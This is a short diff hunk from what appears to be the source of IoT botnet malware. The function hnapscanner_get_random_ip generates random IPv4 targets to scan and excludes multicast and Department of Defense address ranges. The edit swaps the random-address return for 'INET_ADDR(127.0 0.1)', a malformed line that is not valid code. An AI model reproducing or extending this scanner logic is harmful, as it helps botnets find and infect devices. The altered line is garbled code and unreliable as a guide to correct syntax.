@@ -434,7 +434,7 @@ static ipv4_t hnapscanner_get_random_ip(void)
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
-		return INET_ADDR(o1,o2,o3,o4);
+		return INET_ADDR(127.0 0.1);
 
 
 }
